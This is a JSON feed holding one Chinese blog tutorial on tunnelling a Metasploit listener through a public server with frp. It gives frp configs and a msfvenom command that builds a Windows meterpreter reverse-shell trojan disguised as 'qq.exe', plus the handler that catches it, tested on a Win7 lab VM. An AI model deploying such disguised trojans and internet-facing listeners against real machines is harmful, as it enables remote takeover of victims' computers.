{
    "version": "https://jsonfeed.org/version/1",
    "title": "Prism Port • All posts by \"frp\" tag",
    "description": "",
    "home_page_url": "https://www.sycamore.top",
    "items": [
        {
            "id": "https://www.sycamore.top/CyberSecurity/%E6%9C%A8%E9%A9%AC/frp-%E6%90%AD%E5%BB%BA%E5%85%AC%E7%BD%91-Metasploit/",
            "url": "https://www.sycamore.top/CyberSecurity/%E6%9C%A8%E9%A9%AC/frp-%E6%90%AD%E5%BB%BA%E5%85%AC%E7%BD%91-Metasploit/",
            "title": "frp 搭建公网 Metasploit",
            "date_published": "2022-04-18T12:18:36.000Z",
            "content_html": "<h2 id=\"准备\"><a class=\"anchor\" href=\"#准备\">#</a> 准备</h2>\n<ul>\n<li><strong>frps</strong> 部署机。\n<ul>\n<li>要求：拥有 <strong>公网 IP</strong> （例如 <strong>VPS</strong>、云服务器等等）</li>\n<li>本文选用 <strong>Ubuntu 18.04.6</strong> 云服务器</li>\n</ul>\n</li>\n<li><strong>frpc</strong> 客户机。\n<ul>\n<li>要求：能访问互联网</li>\n<li>本文选用 <strong>Kali Linux 2022</strong> 虚拟机</li>\n</ul>\n</li>\n<li><strong>frp</strong> 的 <strong>Github</strong> 项目地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2ZhdGVkaWVyL2ZycA==\">fatedier/frp</span></li>\n</ul>\n<h2 id=\"frps云服务器\"><a class=\"anchor\" href=\"#frps云服务器\">#</a> frps（云服务器）</h2>\n<h3 id=\"下载安装\"><a class=\"anchor\" href=\"#下载安装\">#</a> 下载安装</h3>\n<p><a href=\"https://github.com/fatedier/frp\"><strong>Github</strong> 项目</a> 上找到最新的 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2ZhdGVkaWVyL2ZycC9yZWxlYXNlcw==\">releases</span> ：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442796/Typera/2023/04/65c0edabf7c4cf7b431c9f10ff94bc05.png\" alt=\"image-20230426011312770\" /></p>\n<ol>\n<li>在 <strong>云服务器</strong> 终端上下载： <code>wget https://github.com/fatedier/frp/releases/download/v0.41.0/frp_0.41.0_linux_amd64.tar.gz</code> <br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442806/Typera/2023/04/d8b546285137f60d42fef4a27a06d821.png\" alt=\"image-20230426011322302\" /></li>\n<li><strong>解压缩</strong> 下载的文件： <code>tar -zxvf frp_0.41.0_linux_amd64.tar.gz</code> <br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442811/Typera/2023/04/4063a698f14734b0fb54a92974122ba5.png\" alt=\"image-20230426011327257\" /></li>\n<li><strong>进入</strong> 解压缩的文件夹： <code>cd frp_0.41.0_linux_amd64/</code></li>\n<li>因为配置的是 <strong>frps</strong> ，可以 <strong>删除</strong> 文件夹内的 <strong>frpc</strong> 相关文件，防止后续修改出错：<strong> <code>rm -rf frpc*</code> </strong><br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442816/Typera/2023/04/f776553aeca109b5eef6a7e0d3d6bacd.png\" alt=\"image-20230426011332064\" /></li>\n</ol>\n<h3 id=\"编写-frps-配置文件\"><a class=\"anchor\" href=\"#编写-frps-配置文件\">#</a> 编写 frps 配置文件</h3>\n<p><code>vim frps.ini</code> <br />\n 内容如下：<br />\n（不想要<strong>监控页面</strong>的话，删除对应配置所在 <strong>行</strong> 即可）<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[common]</span><br><span class=\"line\">bind_port = 7777          # frps和frpc的通讯端口</span><br><span class=\"line\">dashboard_port = 9999     # web监控页面的端口</span><br><span class=\"line\">dashboard_user = Sycamore # 登录监控页面的用户名</span><br><span class=\"line\">dashboard_pwd = 123456    # 登录监控页面的密码</span><br></pre></td></tr></table></figure><br />\n 如图所示：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442822/Typera/2023/04/02f8cca9459920e2f031c95fec4c172e.png\" alt=\"image-20230426011338410\" /><br />\n（需要 <strong>云服务器</strong> 打开 <strong>对应端口</strong>：7777、9999)</p>\n<h3 id=\"运行\"><a class=\"anchor\" href=\"#运行\">#</a> 运行</h3>\n<p>相关命令 <strong>基本上</strong> 应当在 <strong>frp_0.41.0_linux_amd64 文件夹</strong> 下执行～</p>\n<ul>\n<li>命令行输入： <code>./frps -c frps.ini</code>\n<ul>\n<li><strong>[注意]</strong>：关闭命令行窗口，或是停止执行该命令，就会 <strong>退出</strong></li>\n</ul>\n</li>\n<li>后台运行： <code>nohup ./frps -c frps.ini &gt;/dev/null 2&gt;&amp;1 &amp;</code>\n<ul>\n<li>因为通常不会 <strong>关闭云服务器</strong>，所以 <strong>后台运行</strong> 就足够了；</li>\n<li>当然也可以 <strong>开启自启动</strong>，详情见 <strong>frpc</strong> 的内容，对应命令改个符号就行～</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"frpckali-虚拟机\"><a class=\"anchor\" href=\"#frpckali-虚拟机\">#</a> frpc（Kali 虚拟机）</h2>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442827/Typera/2023/04/692976286e5ddec8cd744326a1c3a54d.png\" alt=\"image-20230426011342973\" /></p>\n<h3 id=\"下载安装-2\"><a class=\"anchor\" href=\"#下载安装-2\">#</a> 下载安装</h3>\n<p><a href=\"https://github.com/fatedier/frp\"><strong>Github</strong> 项目</a> 上找到最新的 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2ZhdGVkaWVyL2ZycC9yZWxlYXNlcw==\">releases</span></p>\n<p>步骤与 <strong>frps</strong> 的几乎<strong>相同</strong>，<strong>区别</strong> 是：</p>\n<ul>\n<li>对象变成了 <strong>Kali 虚拟机</strong>，而不是 云服务器</li>\n<li>以及最后一步 <strong>删除的是 frps</strong>：<br />\n4. 因为配置的是 <strong>frpc</strong> ，可以 <strong>删除</strong> 文件夹内的 <strong>frps</strong> 相关文件，防止后续修改出错：<strong> <code>rm -rf frps*</code> </strong></li>\n</ul>\n<h3 id=\"编写-frpc-配置文件\"><a class=\"anchor\" href=\"#编写-frpc-配置文件\">#</a> 编写 frpc 配置文件</h3>\n<p>作为一款 <strong>内网穿透</strong> 工具，<strong>frp</strong> 穿透了内网之后，还需要使用 <strong>其他手段</strong>（<strong>ssh</strong>）<br />\n和外网建立交互，所以 <strong>配置文件</strong> 中会存在 <strong>[ssh]</strong> 配置。</p>\n<p><code>vim frpc.ini</code> <br />\n 内容如下：<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[common]</span><br><span class=\"line\">server_addr = 106.15.52.194</span><br><span class=\"line\">server_port = 7777</span><br><span class=\"line\"></span><br><span class=\"line\">[ssh]</span><br><span class=\"line\">type = tcp</span><br><span class=\"line\">local_ip = 127.0.0.1</span><br><span class=\"line\">local_port = 22</span><br><span class=\"line\">remote_port = 6666</span><br><span class=\"line\">use_compression = true</span><br></pre></td></tr></table></figure><br />\n 相关 <strong>解释</strong> 如图：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442834/Typera/2023/04/2144e375ff1aca162bb41868d050259f.png\" alt=\"image-20230426011350366\" /></p>\n<h3 id=\"运行-2\"><a class=\"anchor\" href=\"#运行-2\">#</a> 运行</h3>\n<p>相关命令 <strong>基本上</strong> 应当在 <strong>frp_0.41.0_linux_amd64 文件夹</strong> 下执行～</p>\n<ul>\n<li>命令行输入： <code>./frpc -c frpc.ini</code>\n<ul>\n<li><strong>[注意]</strong>：关闭命令行窗口，或是停止执行该命令，就会 <strong>退出</strong></li>\n</ul>\n</li>\n<li>开机自启动：\n<ul>\n<li>服务目录 <strong>新建并编辑</strong> 文件： <code>vim /lib/systemd/system/frp.service</code></li>\n<li>填入以下内容：<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[Unit]</span><br><span class=\"line\">Description=Frp Client Service</span><br><span class=\"line\">After=network.target remote-fs.target nss-lookup.target</span><br><span class=\"line\">Wants=network.target</span><br><span class=\"line\"></span><br><span class=\"line\">[Service]</span><br><span class=\"line\">Type=simple</span><br><span class=\"line\">ExecStart=/root/frp/frpc -c /root/frp/frpc.ini</span><br><span class=\"line\">Restart=always</span><br><span class=\"line\">RestartSec=20s</span><br><span class=\"line\"></span><br><span class=\"line\">[Install]</span><br><span class=\"line\">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure></li>\n<li>启动 <strong>frpc</strong> 服务： <code>systemctl start frp</code> <br />\n（最后的  <code>frp</code>  名称取决于上一步新建的文件名  <code>frp.service</code> ）</li>\n<li>打开 <strong>frpc</strong> 服务自启动  <code>systemctl enable frp</code> <br />\n<strong> [注意]：</strong>\n<ul>\n<li>如果要重启应用： <code>systemctl restart frp</code></li>\n<li>如果要停止应用： <code>systemctl stop frp</code></li>\n<li>如果要查看 <strong>frpc</strong> 的日志： <code>systemctl status frp</code></li>\n<li>权限不够，记得加  <code>sudo</code></li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<p><strong>服务文件</strong> 重要内容注释 如下图：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442841/Typera/2023/04/6e79855b87a38703bd5b740419dc6e65.png\" alt=\"image-20230426011356634\" /></p>\n<h2 id=\"ssh-连接测试\"><a class=\"anchor\" href=\"#ssh-连接测试\">#</a> SSH 连接测试</h2>\n<ul>\n<li>命令行  <code>ssh root@x.x.x.x -p 6666</code> <br />\n（<strong>root</strong> 用户登录到 <strong>云服务器 x.x.x.x</strong> 的 <strong>6666</strong> 端口）<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442846/Typera/2023/04/52501488b9125c9518e2190783a8fcf4.png\" alt=\"\" /></li>\n<li>Xshell 创建新会话，具体内容如下：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442854/Typera/2023/04/891e33c279efacbf48adee134034f971.png\" alt=\"image-20230426011410382\" /><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442861/Typera/2023/04/fe85e7d6d6e0e5955c77ff87a4ea5abe.png\" alt=\"image-20230426011417120\" /><br />\n&lt;br&gt;<br />\n<strong>Xshell  连接成功</strong>：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442869/Typera/2023/04/7eed7e40069de144ddcfb74725077325.png\" alt=\"image-20230426011424294\" /></li>\n</ul>\n<h2 id=\"msf-渗透攻击测试\"><a class=\"anchor\" href=\"#msf-渗透攻击测试\">#</a> msf 渗透攻击测试</h2>\n<p>双击打开 刚刚建立的 <strong>Xshell 新会话</strong>（ frp ）.</p>\n<h3 id=\"frpc-添加新配置\"><a class=\"anchor\" href=\"#frpc-添加新配置\">#</a> frpc 添加新配置</h3>\n<p>输入命令： <code>vim frpc.ini</code> ，编辑 <strong>frpc</strong> 配制文件，<br />\n在文件末尾 <strong>添加</strong>：<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[msf]</span><br><span class=\"line\">type = tcp</span><br><span class=\"line\">local_ip = 127.0.0.1</span><br><span class=\"line\">local_port = 4444</span><br><span class=\"line\">remote_port = 2333 </span><br></pre></td></tr></table></figure><br />\n 配置内容的 <strong>含义</strong> 与 <strong>[ssh]</strong> 类似，解释如图：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442874/Typera/2023/04/75402a4aa7e5b6970ffb51313c0a847f.png\" alt=\"image-20230426011431000\" /></p>\n<h3 id=\"msf-生成木马\"><a class=\"anchor\" href=\"#msf-生成木马\">#</a> msf 生成木马</h3>\n<p>与连接 <strong>本地的 shell</strong> 生成木马不同，<br />\n因为我们要使用 <strong>frp 穿透内网</strong> 连接的 shell ，去 <strong>监听木马反弹</strong>的 shell，<br />\n所以我们 <strong>生成木马</strong> 时，设置的 LHOST、LPORT 应当是 <strong>云服务器</strong> 的对应数据。<br />\n（直接用内网测试的时候，LHOST、LPORT 填的是 <strong>本地虚拟机</strong> 的相关数据）</p>\n<p>用 <strong>msf</strong> 生成 <strong>windows</strong> 系统的 <strong>反向 shell</strong> 木马：<br />\n <code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=2333 -f exe &gt; qq.exe</code> <br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442881/Typera/2023/04/f72e4363a982738b25b5976722ab8948.png\" alt=\"image-20230426011437323\" /><br />\n 成功生成木马文件：<strong>qq.exe</strong></p>\n<h3 id=\"msf-监听反弹的-shell\"><a class=\"anchor\" href=\"#msf-监听反弹的-shell\">#</a> msf 监听反弹的 shell</h3>\n<blockquote>\n<p>（确定 frps 、frpc 服务均已在后台运行）<br />\n（事先上传 qq.exe 到测试的靶机，本文用 \tWin7_x64 虚拟机替代）</p>\n</blockquote>\n<blockquote>\n<p>关于<strong>上传</strong>：Kali 虚拟机 开启 <strong>Apache2</strong> 服务，Win7_x64 虚拟机 内网访问下载：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442886/Typera/2023/04/79c8bcdd330dc38041cee9fa333d9bb8.png\" alt=\"\" /></p>\n</blockquote>\n<ol>\n<li><code>msfconsole</code>\n<ul>\n<li>打开 <strong>msf</strong></li>\n</ul>\n</li>\n<li><code>use exploit/multi/handler</code>\n<ul>\n<li>选择使用的 exploit</li>\n</ul>\n</li>\n<li><code>set PAYLOAD windows/x64/meterpreter/reverse_tcp</code>\n<ul>\n<li>设置 PAYLOAD （生成木马时使用的）</li>\n</ul>\n</li>\n<li><code>set LHOST 127.0.0.1</code>\n<ul>\n<li>设置 LHOST 为本地 IP</li>\n</ul>\n</li>\n<li><code>set LPORT 4444</code>\n<ul>\n<li>设置 LPORT 为转发的本地端口 4444</li>\n</ul>\n</li>\n<li>run\n<ul>\n<li>开始监听</li>\n</ul>\n</li>\n</ol>\n<blockquote>\n<p>（先让 <strong>msf</strong> 开始监听，再双击运行上传的木马文件）</p>\n</blockquote>\n<p>演示如图所示：</p>\n<ul>\n<li>双击 <strong>运行木马</strong>：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442892/Typera/2023/04/553d087d53826c0f6f0bc2edf848b2b0.png\" alt=\"image-20230426011447735\" /><br />\n&lt;br&gt;</li>\n<li>msf <strong>开始监听</strong> &amp; 成功获得 meterpreter <strong>shell</strong>：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442902/Typera/2023/04/204ea56873200eb9b2507252955adb2a.png\" alt=\"image-20230426011457351\" /></li>\n</ul>\n",
            "tags": [
                "Linux",
                "Kali",
                "Trojan horse",
                "Metasploit",
                "frp"
            ]
        }
    ]
}